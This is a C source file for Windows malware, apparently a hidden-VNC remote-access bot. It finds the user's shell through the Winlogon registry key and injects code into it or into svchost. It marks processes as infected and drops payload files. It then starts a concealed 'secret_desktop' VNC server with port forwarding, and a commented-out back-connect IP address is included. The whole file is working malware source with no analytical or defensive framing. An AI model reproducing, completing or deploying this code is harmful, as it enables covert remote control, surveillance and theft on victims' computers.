#include "includes.h"
#include "svchost_inj.h"
#include "bot\system.h"
#include "dropper.h"
#include "crashrpt.h"
#include "func.h"
#include <hvnc.h>

DWORD dwPID;
char szSelfNameA[MAX_PATH];
TCHAR szSelfName[MAX_PATH];
HANDLE hKillEvent;

void RunAsShellUser()
{
    HKEY hReg;
    if (RegOpenKey(HKEY_LOCAL_MACHINE,_T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),&hReg) == ERROR_SUCCESS)
    {
        DWORD dwTemp=MAX_PATH;
        TCHAR szShell[MAX_PATH];
        if (RegQueryValueEx(hReg,_T("Shell"),NULL,NULL,(byte*)szShell,&dwTemp) == ERROR_SUCCESS)
        {
            DWORD dwShellPID=FindProcess(szShell);
            if (dwShellPID)
            {
                char szApp[MAX_PATH],*pInj=inj32;

                if ((fnIsWow64Process) && (bIsWow64))
                {
                    HANDLE hProc=OpenProcess(PROCESS_QUERY_INFORMATION,false,dwShellPID);
                    if (hProc)
                    {
                        bool bIsWow64=false;
                        fnIsWow64Process(hProc,&bIsWow64);
                        if (!bIsWow64)
                            pInj=inj64;
                        SysCloseHandle(hProc);
                    }
                }

                ExtractOneFile(pInj,szProfilePathA);
                wsprintfA(szApp,"\"%s\\%s\" %d \"%s\"",szProfilePathA,pInj,dwShellPID,szSelfNameA);
                STARTUPINFOA siInfo={0};
                PROCESS_INFORMATION piInfo={0};
                siInfo.cb=sizeof(siInfo);
                CreateProcessA(NULL,szApp,NULL,NULL,false,0,NULL,NULL,&siInfo,&piInfo);
                SysCloseHandle(piInfo.hProcess);
                SysCloseHandle(piInfo.hThread);
            }
        }
        RegCloseKey(hReg);
    }
    return;
}

void GetWOW64()
{
    fnIsWow64Process=(_IsWow64Process *)GetProcAddress(GetModuleHandle(_T("kernel32")),"IsWow64Process");
    if (fnIsWow64Process)
        fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
    return;
}

GLOBAL_BOT_MAPPING *lpGlobalBotMapping;
HANDLE hGlobalBotMapping;

void RunPortForward(int port);

extern bool bCrashRptInit;
TCHAR szProtectionMutex[]=_T("VNC Protection MUTEX");
void WINAPI svchost_thread(void *tmp)
{
    ldr_RebasePE();

    HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,false,szEvent);
    SetEvent(hEvent);
    SysCloseHandle(hEvent);


    hKillEvent=CreateEvent(NULL,true,false,KILL_EVENT_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        ResetEvent(hKillEvent);

    MemInit();
    bCrashRptInit=false;
    InitCrashRpt();

    dwPID=GetCurrentProcessId();
    MarkProcessAsInfected(dwPID);

    hGlobalBotMapping=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(GLOBAL_BOT_MAPPING),GLOBAL_BOT_MAPPING_NAME);
    lpGlobalBotMapping=(GLOBAL_BOT_MAPPING*)MapViewOfFile(hGlobalBotMapping,FILE_MAP_WRITE,0,0,0);
    if (lpGlobalBotMapping)
    {
        GetWOW64();
        ReadConfig();

        HFILE hFile;
        for (int i=0; i <= 20; i++)
        {
            if (hFile=_lopen(szSelfNameA,OF_READWRITE+OF_SHARE_DENY_READ) != HFILE_ERROR)
                break;
            Sleep(1);
        }

#ifndef _DEBUG
        SetErrorMode(SEM_NOGPFAULTERRORBOX+SEM_NOALIGNMENTFAULTEXCEPT+SEM_NOOPENFILEERRORBOX);
#endif

        SetPriorityClass(GetCurrentProcess(),BELOW_NORMAL_PRIORITY_CLASS);
        CreateMutex(NULL,false,szProtectionMutex);
        DropOurShit();
        if (VNCInit(true))
        {
            HVNC_INITIALIZE vnc_init={0};
            lstrcpyA(vnc_init.szDeskName,"secret_desktop");
            HVNC hSecretDesktop=VNCCreateServer(&vnc_init);

            HVNC_CONNECTION_INFO conn={0};
            //lstrcpyA(conn.szBCHost,"188.72.202.163");
            //conn.wBCPort=50000;
            conn.wVNCPort=5900;
            conn.bShared=true;
            VNCStartServer(hSecretDesktop,&conn);
            RunPortForward(0);

            while (VNCGetServerStatus(hSecretDesktop) == HVNC_SERVER_STARTED)
                Sleep(1);
        }
        SetEvent(hKillEvent);

        if (szInj32Exe[0])
            RemoveFileA(szInj32Exe);
        if (szInj64Exe[0])
            RemoveFileA(szInj64Exe);
        _lclose(hFile);
    }
    return;
}

void main()
{
    if (OpenMutex(MUTEX_ALL_ACCESS,false,szProtectionMutex))
        ExitProcess(0);

    MemInit();
    MarkProcessAsInfected(GetCurrentProcessId());

    GetModuleFileNameA(NULL,szSelfNameA,MAX_PATH);
    GetModuleFileName(NULL,szSelfName,MAX_PATH);
    GetUserDir(szProfilePath);

    GetWOW64();

    HWINSTA hWinsta=OpenWindowStation(_T("WinSta0"),false,MAXIMUM_ALLOWED);
    if (hWinsta)
    {
        if (CompareObjects(hWinsta,GetProcessWindowStation()))
        {
            SetProcessWindowStation(hWinsta);
            RunAsShellUser();
        }
        else
        {
            InitInjector(NULL);

            if (!InjectSVCHost(svchost_thread))
                svchost_thread(0);
        }
        SysCloseHandle(hWinsta);
    }
    ExitProcess(0);
}

